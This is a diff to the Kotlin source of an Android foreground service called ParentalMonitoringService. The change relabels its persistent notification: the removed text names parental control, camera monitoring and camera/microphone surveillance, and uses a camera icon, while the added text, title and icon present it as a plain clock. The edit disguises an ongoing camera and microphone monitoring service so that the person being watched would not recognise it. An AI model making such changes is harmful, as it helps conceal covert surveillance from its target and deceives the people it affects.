@@ -65,7 +65,7 @@ class ParentalMonitoringService : Service() {
         if (!isRunning) {
             isRunning = true
             try {
-                val notification = buildNotification("Servis Başlatılıyor...")
+                val notification = buildNotification("--:--:--")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                     var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -96,7 +96,7 @@ class ParentalMonitoringService : Service() {
             val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
             while (isRunning) {
                 val currentTime = timeFormat.format(Date())
-                val notificationText = "Canlı Takip Aktif • Saat: $currentTime"
+                val notificationText = currentTime
                 
                 val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                 notificationManager.notify(NOTIFICATION_ID, buildNotification(notificationText))
@@ -110,10 +110,10 @@ class ParentalMonitoringService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Ebeveyn Kontrol Takip Servisi",
+                "Saat Servisi",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Uygulama kapalı olsa bile saati göstererek kamerayı ve mikrofonu izlenebilir tutar."
+                description = "Uygulama bildiriminde saati gösterir."
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
@@ -122,9 +122,9 @@ class ParentalMonitoringService : Service() {
 
     private fun buildNotification(contentText: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Ebeveyn Kontrolü & Kamera İzleme")
+            .setContentTitle("Saat")
             .setContentText(contentText)
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setSmallIcon(android.R.drawable.ic_menu_today)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
